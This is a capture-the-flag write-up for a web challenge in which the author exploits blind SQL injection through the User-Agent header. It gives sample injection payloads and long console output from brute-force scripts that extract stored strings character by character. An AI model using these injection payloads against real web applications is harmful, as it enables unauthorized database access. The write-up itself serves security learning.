### Challenge

```
Secret Agents
Can you enter the secret agent portal? I've heard someone has a flag :eyes:

Our insider leaked the source, but was "terminated" shortly thereafter...
```

* Source at /src
  - The page contents are 
```
Welcome to the Super Secret Agents official site!


Only super secret agents will be able to enter... will you?


Unfortunately for the not-so-super-secret agents, our advanced AI neural network blockchain big data Python3.5 Docker DigitalOcean military-grade encryption cybersecurity algorithm will keep them out without needing a login system!


Here's the secret: actual secret agents have their OWN BROWSERS!!!!! NOT POSERS


Will it let you in? Enter!
```

### Recon
* From the code it is evident that SQL Injection is what is required
* One bad thing here is the response is not returned ---> Need BLIND SQLI
* One good thing here is different types of responses are returned
  - when no input or sqli failure we get `NO`
  - when sqli works but more than one query is returned we get `CLOSE` when its not exactly true or more than 1 results are returned
  - Success response should give us the flag
* Blind SQL injection to look for character by character as a substring in UA field of Agents table
  - With the `NO and CLOSE` responses we can iterate over each character of the sqli to check the UA string of the agents tabl
```
  User-Agent: ' OR 1=(SELECT 1 FROM Agents WHERE UA REGEXP '^[a-z]' LIMIT 0,1); --
  User-Agent: ' OR 1=(SELECT 1 FROM Agents WHERE UA REGEXP '^[a-n]' LIMIT 0,1); --
  User-Agent: ' OR 1=(SELECT 1 FROM Agents WHERE UA REGEXP '^b[u-z]' LIMIT 0,1); --
```

### Solve 
- Doing it with programs ( bruteforce a-z )
  - Try to use Binary search to perform regex type programming to make it faster --> pending ( going to brute as of now! )

```
(env) Srinivass-MacBook-Pro:secretAgents darkknight$ python exploit.py 
bz
bzz
bzzz
bzzzz
bzzzzz
bzzzzzz
bzzzzzzz
bzzzzzzzt
bzzzzzzzta
bzzzzzzztaa
bzzzzzzztaaa
bzzzzzzztaaaa
<!DOCTYPE html>

<html>
<head>
	<title>Super Secret Agents Login</title>
</head>
<body style="padding: 50px">
	<p>Welcome, mort</p>
</body>
</html>
bzzzzzzztaaaa
(env) Srinivass-MacBook-Pro:secretAgents darkknight$ 
``` 

* ( Thinking ... ) No flag yet... Tweak and Modular Run with BACKTRACK AND BINARY SEARCH
```
(env) Srinivass-MacBook-Pro:secretAgents darkknight$ python exploit_brute.py 
Start for offset: 0
^b
^bz
^bzz
^bzzz
^bzzzz
^bzzzzz
^bzzzzzz
^bzzzzzzz
^bzzzzzzzt
^bzzzzzzzta
^bzzzzzzztaa
^bzzzzzzztaaa
^bzzzzzzztaaaa
['^bzzzzzzztaaaa']
^h
^hi
^hii
^hiii
^hiiii
^hiiiii
^hiiiii\\s
^hiiiii\\sw
^hiiiii\\swh
^hiiiii\\swha
^hiiiii\\swhat
^hiiiii\\swhati
^hiiiii\\swhatis
^hiiiii\\swhatis\\s
^hiiiii\\swhatis\\so
^hiiiii\\swhatis\\sou
^hiiiii\\swhatis\\sour
^hiiiii\\swhatis\\sour\\s
^hiiiii\\swhatis\\sour\\sa
^hiiiii\\swhatis\\sour\\saa
^hiiiii\\swhatis\\sour\\saaa
['^bzzzzzzztaaaa', '^hiiiii\\\\swhatis\\\\sour\\\\saaa']
^i
^i\\s
^i\\sw
^i\\swa
^i\\swan
^i\\swant
^i\\swant\\s
^i\\swant\\st
^i\\swant\\sth
^i\\swant\\stha
^i\\swant\\sthat
^i\\swant\\sthat\\s
^i\\swant\\sthat\\sk
^i\\swant\\sthat\\skr
^i\\swant\\sthat\\skra
^i\\swant\\sthat\\skrab
^i\\swant\\sthat\\skrabb
^i\\swant\\sthat\\skrabby
^i\\swant\\sthat\\skrabby\\s
^i\\swant\\sthat\\skrabby\\sp
^i\\swant\\sthat\\skrabby\\spa
^i\\swant\\sthat\\skrabby\\spat
^i\\swant\\sthat\\skrabby\\spatt
^i\\swant\\sthat\\skrabby\\spatty
['^bzzzzzzztaaaa', '^hiiiii\\\\swhatis\\\\sour\\\\saaa', '^i\\\\swant\\\\sthat\\\\skrabby\\\\spatty']
^n
^ne
^nee
^neee
^neeee
^neeeee
^neeeeee
^neeeeeee
^neeeeeeee
^neeeeeeeee
^neeeeeeeeee
^neeeeeeeeeee
^neeeeeeeeeeee
^neeeeeeeeeeeee
^neeeeeeeeeeeeee
^neeeeeeeeeeeeeee
^neeeeeeeeeeeeeeee
^neeeeeeeeeeeeeeeee
^neeeeeeeeeeeeeeeeee
^neeeeeeeeeeeeeeeeeee
^neeeeeeeeeeeeeeeeeeee
^neeeeeeeeeeeeeeeeeeeee
^neeeeeeeeeeeeeeeeeeeeee
^neeeeeeeeeeeeeeeeeeeeeee
^neeeeeeeeeeeeeeeeeeeeeeee
^neeeeeeeeeeeeeeeeeeeeeeeeu
^neeeeeeeeeeeeeeeeeeeeeeeeum
['^bzzzzzzztaaaa', '^hiiiii\\\\swhatis\\\\sour\\\\saaa', '^i\\\\swant\\\\sthat\\\\skrabby\\\\spatty', '^neeeeeeeeeeeeeeeeeeeeeeeeum']
^ni
^nic
^nice
^nice\\s
^nice\\st
^nice\\str
^nice\\stry
^nice\\stry\\s
^nice\\stry\\sb
^nice\\stry\\sbu
^nice\\stry\\sbut
^nice\\stry\\sbut\\s
^nice\\stry\\sbut\\st
^nice\\stry\\sbut\\sth
^nice\\stry\\sbut\\sthi
^nice\\stry\\sbut\\sthis
^nice\\stry\\sbut\\sthis\\s
^nice\\stry\\sbut\\sthis\\si
^nice\\stry\\sbut\\sthis\\sis
^nice\\stry\\sbut\\sthis\\sis\\s
^nice\\stry\\sbut\\sthis\\sis\\sh
^nice\\stry\\sbut\\sthis\\sis\\sha
^nice\\stry\\sbut\\sthis\\sis\\shar
^nice\\stry\\sbut\\sthis\\sis\\shard
^nice\\stry\\sbut\\sthis\\sis\\sharde
^nice\\stry\\sbut\\sthis\\sis\\sharder
^nice\\stry\\sbut\\sthis\\sis\\sharder\\s
^nice\\stry\\sbut\\sthis\\sis\\sharder\\s:
^nice\\stry\\sbut\\sthis\\sis\\sharder\\s:p
['^bzzzzzzztaaaa', '^hiiiii\\\\swhatis\\\\sour\\\\saaa', '^i\\\\swant\\\\sthat\\\\skrabby\\\\spatty', '^neeeeeeeeeeeeeeeeeeeeeeeeum', '^nice\\\\stry\\\\sbut\\\\sthis\\\\sis\\\\sharder\\\\s:p']
^\\s
^\\sa
^\\saa
^\\saaa
^\\saaaa
['^bzzzzzzztaaaa', '^hiiiii\\\\swhatis\\\\sour\\\\saaa', '^i\\\\swant\\\\sthat\\\\skrabby\\\\spatty', '^neeeeeeeeeeeeeeeeeeeeeeeeum', '^nice\\\\stry\\\\sbut\\\\sthis\\\\sis\\\\sharder\\\\s:p', '^\\\\saaaa']
^\\ss
^\\ssh
^\\sshr
^\\sshre
^\\sshrek
^\\sshrek\\s
^\\sshrek\\sv
['^bzzzzzzztaaaa', '^hiiiii\\\\swhatis\\\\sour\\\\saaa', '^i\\\\swant\\\\sthat\\\\skrabby\\\\spatty', '^neeeeeeeeeeeeeeeeeeeeeeeeum', '^nice\\\\stry\\\\sbut\\\\sthis\\\\sis\\\\sharder\\\\s:p', '^\\\\saaaa', '^\\\\sshrek\\\\sv']
^1
^12
^123
^123u
^123uj
^123ujk
^123ujkl
^123ujkla
^123ujklag
^123ujklagu
^123ujklaguh
^123ujklaguhj
^123ujklaguhjn
^123ujklaguhjnk
^123ujklaguhjnka
^123ujklaguhjnkad
^123ujklaguhjnkads
^123ujklaguhjnkadsu
^123ujklaguhjnkadsuo
^123ujklaguhjnkadsuop
^123ujklaguhjnkadsuop9
^123ujklaguhjnkadsuop98
^123ujklaguhjnkadsuop98u
^123ujklaguhjnkadsuop98ui
^123ujklaguhjnkadsuop98uij
^123ujklaguhjnkadsuop98uij2
^123ujklaguhjnkadsuop98uij2k
^123ujklaguhjnkadsuop98uij2k3
^123ujklaguhjnkadsuop98uij2k3l
^123ujklaguhjnkadsuop98uij2k3l4
^123ujklaguhjnkadsuop98uij2k3l4m
^123ujklaguhjnkadsuop98uij2k3l4ml
^123ujklaguhjnkadsuop98uij2k3l4mlg
^123ujklaguhjnkadsuop98uij2k3l4mlgj
^123ujklaguhjnkadsuop98uij2k3l4mlgja
^123ujklaguhjnkadsuop98uij2k3l4mlgjai
^123ujklaguhjnkadsuop98uij2k3l4mlgjais
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisd
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdo
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdop
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopg
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgj
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;m
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;ml
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlk
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k2
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k23
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234l
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lk
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkj
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjh
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjha
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhas
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd8
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f7
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f70
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709i
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709io
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok2
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23j
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jk
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkd
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\s
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\sk
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\ske
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skey
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeyb
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeybo
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeyboa
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeyboar
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeyboard
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeyboard\\s
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeyboard\\sb
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeyboard\\sba
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeyboard\\sbas
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeyboard\\sbash
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeyboard\\sbash\\s
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeyboard\\sbash\\so
^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\skeyboard\\sbash\\sop
['^bzzzzzzztaaaa', '^hiiiii\\\\swhatis\\\\sour\\\\saaa', '^i\\\\swant\\\\sthat\\\\skrabby\\\\spatty', '^neeeeeeeeeeeeeeeeeeeeeeeeum', '^nice\\\\stry\\\\sbut\\\\sthis\\\\sis\\\\sharder\\\\s:p', '^\\\\saaaa', '^\\\\sshrek\\\\sv', '^123ujklaguhjnkadsuop98uij2k3l4mlgjaisdopgjk;mlkl;k234lkjhasd89f709iok23jkdf\\\\skeyboard\\\\sbash\\\\sop']
```

### References
* https://portswigger.net/web-security/sql-injection/blind
* 